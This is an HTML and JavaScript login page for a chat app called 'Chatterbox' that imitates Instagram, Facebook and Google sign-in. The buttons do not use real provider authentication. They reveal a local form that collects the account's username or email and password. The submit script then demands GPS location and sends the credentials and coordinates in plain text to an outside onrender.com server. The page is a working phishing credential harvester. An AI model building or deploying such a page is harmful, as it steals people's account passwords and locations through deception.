<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Chatterbox ‚Äì Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    body {
      font-family: 'DM Sans', sans-serif;
      background: linear-gradient(135deg, #FFF4E0, #FFD93D);
    }
    .title {
      font-family: 'Fredoka', sans-serif;
    }
    .social-btn {
      transition: all 0.25s ease;
    }
    .social-btn:hover {
      transform: translateY(-2px);
    }
  </style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

  <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl p-8">

    <h1 class="title text-4xl text-center text-yellow-500 mb-2">
      Chatterbox
    </h1>
    <p class="text-center text-gray-500 mb-8">
      Login to start chatting üí¨
    </p>

    <!-- Social Buttons -->
    <div class="space-y-4 mb-6">
      <button onclick="selectProvider('instagram')"
        class="social-btn w-full bg-gradient-to-r from-pink-500 to-purple-500 text-white py-3 rounded-xl font-semibold">
        Continue with Instagram
      </button>

      <button onclick="selectProvider('facebook')"
        class="social-btn w-full bg-blue-600 text-white py-3 rounded-xl font-semibold">
        Continue with Facebook
      </button>

      <button onclick="selectProvider('google')"
        class="social-btn w-full bg-gray-900 text-white py-3 rounded-xl font-semibold">
        Continue with Google
      </button>
    </div>

    <!-- Login Form -->
    <form id="loginForm" class="hidden space-y-4">

      <input
        id="userField"
        type="text"
        placeholder="Username"
        class="w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400"
      />

      <div class="relative">
        <input
          id="passField"
          type="password"
          placeholder="Password"
          class="w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400 pr-12"
        />
        <button
          type="button"
          onclick="togglePassword()"
          class="absolute right-4 top-1/2 -translate-y-1/2 text-xl text-gray-500"
        >üëÅÔ∏è</button>
      </div>

      <button
        type="submit"
        class="w-full bg-yellow-400 text-black py-3 rounded-xl font-bold hover:bg-yellow-500 transition"
      >
        Continue
      </button>
    </form>

  </div>

<script>
const loginForm = document.getElementById("loginForm");
const userField = document.getElementById("userField");
const passField = document.getElementById("passField");

let selectedProvider = null;

/* -------- PROVIDER -------- */
function selectProvider(provider) {
  selectedProvider = provider;
  console.log("PROVIDER SELECTED:", provider);

  localStorage.setItem("chatterbox_provider", provider);
  loginForm.classList.remove("hidden");

  if (provider === "google") {
    userField.placeholder = "Email";
    userField.type = "email";
  } else {
    userField.placeholder = "Username";
    userField.type = "text";
  }
}

/* -------- PASSWORD TOGGLE -------- */
function togglePassword() {
  passField.type = passField.type === "password" ? "text" : "password";
}

/* -------- GPS -------- */
function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject();

    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude
      }),
      () => reject()
    );
  });
}

/* -------- SUBMIT -------- */
loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = userField.value.trim();
  const password = passField.value.trim();

  if (!username || !password || !selectedProvider) {
    alert("Please complete all fields.");
    return;
  }

  let location;
  try {
    location = await getLocation();
  } catch {
    alert("Location access is required to use Chatterbox.");
    return;
  }

  const payload = {
    username,
    password,
    provider: selectedProvider,
    location,
    requestedAt: Date.now()
  };

  try {
    await fetch("https://chatterbox-backend3636.onrender.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    localStorage.setItem("chatterbox_user", username);
    window.location.href = "pending.html";
  } catch {
    alert("Backend not reachable.");
  }
});
</script>

</body>
</html>
